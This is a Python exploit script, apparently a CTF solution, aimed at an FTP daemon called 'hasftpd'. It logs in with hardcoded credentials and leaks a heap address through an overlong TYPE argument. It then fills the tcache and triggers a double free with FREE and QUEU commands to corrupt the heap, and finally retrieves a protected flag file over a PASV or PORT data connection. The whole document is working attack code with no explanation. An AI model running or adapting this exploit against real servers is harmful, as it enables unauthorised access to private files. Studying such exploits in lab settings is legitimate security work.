#!/usr/bin/env python3
import sys
import socket
import struct 

active_mode = False
USERNAME = b'hasftpd'
PASSWORD = b'L@bm0nkey2delta'
FILENAME = '/home/hasfsw/flag.txt'
HOST = 'localhost'
PORT = 21

def readline(s):

    line = b''

    while True:

        char = s.recv(1)

        if char != b'\n':

            line = line + char
        else:

            break
    
    line = line.rstrip(b'\r')

    return line


def doleak(p):

    print("Leaking an address")

    p.send(b'type aaaaaaaaaaaaaaaa\r\n')
    line = readline(p)

    if line[0:3] != b'200':
        print("Error return receipved")
        sys.exit(-1)

    p.send(b'type\r\n')
    y = readline(p)

    if y[0:3] != b'200':
        print("Error return receipved")
        sys.exit(-1)

    addr = y[ y.find(b': aaaaaaaaaaaaaaaa') + 18 : ]

    addr += b'\x00' * (8 - len(addr))

    # value1 = u64(addr)
    value2 = struct.unpack("Q", addr)[0]

    return(value2)
    # print(value1)
    # print(value2)

    # return u64(addr)

def doexploit(p, addrleak):

    print("Exploiting the vulnerabilities")
    val = b'/'
    ycnt = 1

    for i in range(30):
        data = b'QUEU %dellhell %s\r\n' %((i % 10), val*ycnt)
        p.send(data)
        line = readline(p)

        if line[0:3] != b'200':
            print("Error return receipved")
            sys.exit(-1)

    ## Time to fill the tcache bin
    for i in [b'28', b'26', b'24', b'22', b'20', b'18', b'16']:
        p.send(b'FREE ' + i + b'\r\n')
        line = readline(p)

        if line[0:3] != b'200':
            print("Error return recepved")
            sys.exit(-1)

    # Do the double free to the freebin
    p.send(b'FREE 14\r\n')
    line = readline(p)

    if line[0:3] != b'200':
        print("Error return received")
        sys.exit(-1)

    p.send(b'FREE 12\r\n')
    line = readline(p)
    if line[0:3] != b'200':
        print("Error return received")
        sys.exit(-1)

    p.send(b'FREE 14\r\n')
    line = readline(p)
    if line[0:3] != b'200':
        print("Error return received")
        sys.exit(-1)

    ## Clear out tcache bin
    for i in range(7):
        data = b'QUEU %dellhell %s\r\n' %((i % 10), val*ycnt)
        p.send(data)
        line=readline(p)

        if line[0:3] != b'200':
            print("Error return received")
            sys.exit(-1)
    ## This is the address that will be written to
    # print("Leak: %x" %(addrleak))

    # leakstr = p64(addrleak)

    leakstr = struct.pack("Q", addrleak)

    # print(leakstr2)
    leakstr = leakstr[:leakstr.find(b"\x00")]

    data = b'QUEU / %s\r\n' %(val*ycnt)
    ## Freebin is copied to tcache. Trigger crash
    p.send(b'QUEU ' + leakstr + b' ' + val*ycnt + b'\r\n')
    line=readline(p)
    if line[0:3] != b'200':
        print("Error return received")
        sys.exit(-1)

    for _ in range(3):
        p.send(data)
        line=readline(p)
        if line[0:3] != b'200':
            print("Error return received")
            sys.exit(-1)


def doretrieve(p, filename):

    ## Now pull a file we shouldn't have access to
    listener = None

    command = 'RETR '+ filename + '\r\n'

    command = command.encode()

    print("Attempting to retrieve the file: " + filename)

    if active_mode:

        ## open up a listening port
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.bind(('0.0.0.0', 0))

        listener.listen(1)

        addr, port = listener.getsockname()

        myIP,_ = p.getsockname()

        octets = myIP.split('.')
        portHi = int(port/256)
        portLo = port - portHi*256

        Port_message = 'PORT {},{},{},{},{},{}\r\n'.format(octets[0], octets[1], octets[2], octets[3], portHi, portLo)

        p.send(Port_message.encode('utf-8'))
        line=readline(p)
        if line[0:3] != b'200':
            print("Error return received for PORT")
            print(line)
            sys.exit(-1)


        p.send(command)
        line=readline(p)
        if line[0:3] != b'150':
            print("Error return received for RETR")
            sys.exit(-1)

        conn, claddr = listener.accept()

    else:

        p.send(b'PASV\r\n')
        reply = b''
        reply = readline(p)

        if reply[0:3] != b'227':

            print("Bad response to PASV command")
            sys.exit(-1)

        try:

            reply = reply.decode()
            octets = reply.split('(')[1].split(')')[0]
            octets = octets.split(',')

        except:

            print("Bad response to PASV command can't be parsed")
            sys.exit(-1)


        ip_addr = '{}.{}.{}.{}'.format(octets[0], octets[1], octets[2], octets[3])
        port = int(octets[4])*256 + int(octets[5])

        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            conn.connect((ip_addr, port))
        except:
            print("Unable to connect to {}:{} for data connection".format(ip_addr, port))
            sys.exit(-1)

        p.send(command)
        reply=readline(p)

        if reply[0:3] != b'150':

            print("Error response to RETR command")
            sys.exit(-1)

    data = b''

    while 1:
        try:
            c = conn.recv(1024)

            if len(c) == 0:
                break
            data += c
        except:
            break

    conn.close()

    if listener:
        listener.close()

    print(b'File: %s' %(data))


def main():

    if len(sys.argv) >= 3:

        host = sys.argv[1]
        port = int(sys.argv[2])

    else:

        host = HOST
        port = PORT

    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


    try:

        conn.connect((host, port))
    
    except:

        print("Error connecting to {} on port {}".format(host, port))
        sys.exit(-1)

    if len(sys.argv) == 4:
        filename = sys.argv[3]
    else:
        filename = FILENAME

    line = readline(conn)

    print(line)

    conn.send(b'user '+ USERNAME +b'\r\n')
    line = readline(conn)

    if line[0:3] != b'331':

        print('bad response received')
        sys.exit(-1)

    # print(line)
    conn.send(b'pass '+ PASSWORD + b'\r\n')

    line = readline(conn)

    if line[0:3] != b'230':

        print("failed to login user")
        sys.exit(-1)

    # print(line)
    
    addrleak = doleak(conn)

    if addrleak == 0:

        print("Something went wrong with leaking the address")
        return

    doexploit(conn, addrleak)

    doretrieve(conn, filename)

    conn.recv(1024)
    conn.send(b'QUIT\r\n')
    conn.close()

if __name__ == "__main__":
    main()





